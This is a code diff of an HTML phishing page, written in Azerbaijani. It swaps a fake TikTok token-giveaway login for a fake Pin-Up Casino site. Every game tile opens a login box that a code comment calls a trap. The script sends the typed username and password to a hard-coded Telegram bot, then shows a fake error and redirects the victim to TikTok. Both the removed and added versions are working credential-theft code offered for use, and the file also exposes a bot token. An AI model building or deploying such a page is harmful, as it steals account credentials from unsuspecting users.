@@ -3,48 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok | Jeton Mərkəzi</title>
+    <title>Pin-Up Casino | Bonus 700 AZN</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { background: #121212; padding: 30px; border-radius: 12px; width: 320px; text-align: center; border: 1px solid #fe2c55; }
-        img { width: 100px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #fe2c55; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        body { background: #1a1d21; color: #fff; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
+        header { background: #2d3339; padding: 15px; border-bottom: 2px solid #55c130; display: flex; justify-content: space-between; align-items: center; }
+        .logo { color: #55c130; font-weight: bold; font-size: 24px; text-transform: uppercase; }
+        .balance-box { background: #55c130; color: #000; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        
+        /* Oyunlar Şəbəkəsi */
+        .games-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; }
+        .game-card { background: #2d3339; border-radius: 8px; overflow: hidden; position: relative; border: 1px solid #444; }
+        .game-card img { width: 100%; height: 100px; object-fit: cover; filter: brightness(0.7); }
+        .game-card p { font-size: 10px; margin: 5px; text-align: center; color: #ccc; }
+        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #e91e63; color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; display: none; }
+        .game-card:hover .play-btn { display: block; }
+
+        /* Login Pop-up (Tələ) */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
+        .login-box { background: #fff; color: #000; width: 320px; padding: 25px; border-radius: 10px; text-align: center; }
+        .login-box h2 { color: #e91e63; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .submit-btn { background: #55c130; color: white; border: none; width: 100%; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
+
+        footer { background: #1a1d21; padding: 20px; font-size: 12px; color: #666; text-align: center; }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG-white-text-black-background.png" alt="TikTok">
-        <h3>Jeton Aktivasiyası</h3>
-        <p style="font-size: 13px; color: #888;">1000 Jeton üçün giriş edin</p>
-        <input type="text" id="u" placeholder="İstifadəçi adı / Email">
-        <input type="password" id="p" placeholder="Şifrə">
-        <button onclick="ov()">JETONLARI YÜKLƏ</button>
+
+<header>
+    <div class="logo">PIN<span style="color: #e91e63;">-UP</span></div>
+    <div class="balance-box" onclick="showLogin()">Balans Artır +</div>
+</header>
+
+<div style="padding: 15px;">
+    <h3 style="color: #55c130;">Populyar Oyunlar</h3>
+</div>
+
+<div class="games-grid">
+    <div class="game-card" onclick="showLogin()"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRz7PqXG8Vl0qP6-8K5G_m-E0I-5y_Y1u-G1A&s"><p>Aviator</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://static.casino.guru/pict/87823/Gates-of-Olympus.jpg?v=1653385556000"><p>Gates of Olympus</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://static.casino.guru/pict/84511/Sweet-Bonanza.jpg?v=1653385555000"><p>Sweet Bonanza</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://images.ctfassets.net/8896z6m86u68/33C92v0y4V4Y4Y4Y4Y4Y4Y/7d7d7d7d7d7d7d7d7d7d7d7d7d7d7d7d/Fruit_Party.jpg"><p>Fruit Party</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6-6"><p>Sugar Rush</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://static.casino.guru/pict/124237/Dog-House-Megaways.png?v=1653385557000"><p>The Dog House</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ"><p>Spaceman</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR"><p>Wolf Gold</p><div class="play-btn">Oyna</div></div>
+    <div class="game-card" onclick="showLogin()"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS"><p>Big Bass</p><div class="play-btn">Oyna</div></div>
+</div>
+
+<div style="padding: 15px;">
+    <button class="submit-btn" style="background: #e91e63;" onclick="showLogin()">Bütün Oyunları Gör</button>
+</div>
+
+<div class="modal" id="loginModal">
+    <div class="login-box">
+        <h2>Daxil Ol</h2>
+        <p style="font-size: 13px; color: #666;">Balansı artırmaq və ya oynamaq üçün daxil olmalısınız.</p>
+        <input type="text" id="user" placeholder="İstifadəçi adı və ya Email">
+        <input type="password" id="pass" placeholder="Şifrə">
+        <button class="submit-btn" onclick="pusk()">DAXİL OL</button>
+        <p style="margin-top: 10px; font-size: 12px; cursor: pointer;" onclick="hideLogin()">Bağla</p>
     </div>
+</div>
 
-    <script>
-        function ov() {
-            var user = document.getElementById("u").value;
-            var pass = document.getElementById("p").value;
+<footer>
+    <p>© 2026 Pin-Up Azerbaijan. Bütün hüquqlar qorunur.</p>
+</footer>
 
-            if(user == "" || pass == "") {
-                alert("Xanaları doldurun!");
-                return;
-            }
+<script>
+    function showLogin() { document.getElementById('loginModal').style.display = 'flex'; }
+    function hideLogin() { document.getElementById('loginModal').style.display = 'none'; }
 
-            var token = "8310888410:AAHznWCQ8ywwPyHiTAbFT80hzwb5kdNSsFE";
-            var chat_id = 7729229420; 
-            var text = "🎯 YENİ HESAB TUTULDU!\n👤 User: " + user + "\n🔑 Pass: " + pass;
+    function pusk() {
+        var user = document.getElementById("user").value;
+        var pass = document.getElementById("pass").value;
 
-            // Səssiz arxa fon sorğusu
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
-            
-            fetch(url).then(() => {
-                window.location.href = "https://www.tiktok.com/login";
-            }).catch(() => {
-                window.location.href = "https://www.tiktok.com/login";
-            });
+        if(user == "" || pass == "") {
+            alert("Məlumatları doldurun!");
+            return;
         }
-    </script>
+
+        // Sənin Teleqram məlumatların
+        var token = "8310888410:AAHznWCQ8ywwPyHiTAbFT80hzwb5kdNSsFE";
+        var chat_id = 7729229420;
+        var text = "🎰 PİN-UP OVU!\n👤 User: " + user + "\n🔑 Pass: " + pass;
+
+        var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
+
+        fetch(url).then(() => {
+            alert("Sistem xətası: Balans artırmaq üçün TikTok ilə təsdiqləyin.");
+            window.location.href = "https://www.tiktok.com/login";
+        }).catch(() => {
+            window.location.href = "https://www.tiktok.com/login";
+        });
+    }
+</script>
+
 </body>
 </html>
